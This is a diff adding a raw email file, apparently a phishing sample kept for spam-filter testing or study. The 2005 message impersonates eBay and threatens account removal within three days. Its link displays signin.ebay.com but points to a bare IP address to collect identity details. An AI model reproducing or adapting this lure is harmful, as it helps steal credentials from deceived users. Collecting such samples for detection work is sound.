@@ -1,0 +1,124 @@
+From nobody Sun Jan 25 13:49:56 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 2B1DB2A88C
+ for <user@example.com>; Mon,  5 Sep 2005 05:46:33 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 2644A621C92; Mon,  5 Sep 2005 05:46:33 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 0AA92621C89
+ for <user@example.com>; Mon,  5 Sep 2005 05:46:33 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id FAA27267
+ for user@example.com; Mon, 5 Sep 2005 05:46:32 -0400
+Received: from 209.200.117.87 ([209.200.117.87])
+ by mail.example.com with SMTP id FAA27257;
+ Mon, 5 Sep 2005 05:46:31 -0400
+Received: from 214.178.173.16 by ; Mon, 05 Sep 2005 11:42:34 +0200
+Message-ID: <QYZBLUDHNAWZWYIYEYRF@hotmail.com>
+From: "eBay Security Department" <accounts@ebay.com>
+Reply-To: "eBay Security Department" <accounts@ebay.com>
+To: yan@biochemistry.bioc.cwru.edu, roth@biochemistry.bioc.cwru.edu,
+ user@biochemistry.bioc.cwru.edu, ashok@biochemistry.bioc.cwru.edu,
+ shoham@biochemistry.bioc.cwru.edu
+Subject: Notification of Limited Account Access
+Date: Mon, 05 Sep 2005 14:43:34 +0500
+X-Mailer: eGroups Message Poster
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--716305501557759952"
+X-Priority: 1
+X-MSMail-Priority: High
+Content-Length: 3035
+Lines: 85
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 134
+
+----716305501557759952
+Content-Type: text/html;
+Content-Transfer-Encoding: quoted-printable
+
+<html>
+<style type=3D"text/css">
+<!--
+.style3 {color: #FFFFFF}
+-->
+</style>
+
+<body>
+<table cellpadding=3D"2" cellspacing=3D"0" border=3D"0" style=3D"border: #=
+e0e0e0 1px solid;" width=3D"100%">
+  <tr>
+    <td><p class=3D"V1Gray"><img alt=3D"The World's Online Marketplace" sr=
+c=3D"http://www.hansbrunnertools.gil.com.au/images/ebaylogo.gif" border=3D=
+0></p>
+        <p></p></td>
+  </tr>
+</table>
+<table cellSpacing=3D"0" cellPadding=3D"0" width=3D"100%" align=3D"center"=
+ border=3D"0">
+  <tbody>
+    <tr>
+      <td bgColor=3D"#9999cc" width=3D"1"><img height=3D"1" src=3D"http://=
+pics.ebaystatic.com/aw/pics/s.gif"></td>
+      <td>
+        <table cellSpacing=3D"0" cellPadding=3D"0" width=3D"100=
+%" align=3D"center" border=3D"0">
+          <tbody>
+            <tr bgColor=3D"#9999cc" height=3D"26">
+              <td> <span class=3D"A3B" style=3D"color:white;">Welcome to M=
+y Messages</span></td>
+            </tr>
+            <tr>
+              <td>
+                <table cellSpacing=3D"0" cellPadding=3D"5" width=3D"100=
+%" bgColor=3D"white" border=3D"0">
+                  <tbody>
+                    <tr>
+                      <td colSpan=3D"6" bgcolor=3D"#FFFFFF"><img src=3D"ht=
+tp://pics.ebaystatic.com/aw/pics/myMessages/note_570x30.gif" border=3D"0">=
+
+                          <p> Dear eBay member 
+                          <p> This e-mail is the notification of recent in=
+novations taken by eBay to detect inactive customers and non-functioning b=
+illing process.<br>
+                          The inactive customers are subject to restrictio=
+n and removal in the next 3 days. <br>
+                          You must click the link to complete the process.=
+</p>
+                          <a href=3D"http://81.195.209.42/ISAPI.dll/accoun=
+t-information-update/verify/eb5.02/index.html">http://signin.ebay.com/eBay=
+ISAPI.dll?SignIn&UserIDmail=3D</a>
+                        <p></p>
+                        <p align=3D"left">(To complete the verification pr=
+ocess you must fill in all the required fields)</p>
+                        <p> Notice: Refusal to provide confirmation of ide=
+ntity when requested are subject to restriction and removal.</p>
+                        <p>Regards,<br>
+                          Customer Support (Trust and Safety Department), =
+<span class=3D"style3"> </span></p></td>
+                    </tr>
+                    <tr>
+                      <td height=3D"10"></td>
+                    </tr>
+                  </tbody>
+              </table></td>
+            </tr>
+            <tr>
+              <td width=3D"100%" bgColor=3D"#9999cc"><img height=3D"1" src=
+=3D"http://pics.ebaystatic.com/aw/pics/s.gif" width=3D"1"></td>
+            </tr>
+          </tbody>
+      </table></td>
+      <td bgColor=3D"#9999cc" width=3D"1"><img height=3D"1" src=3D"http://=
+pics.ebaystatic.com/aw/pics/s.gif" width=3D"1"></td>
+    </tr>
+  </tbody>
+</table>
+</body>
+</html>
+
+----716305501557759952--
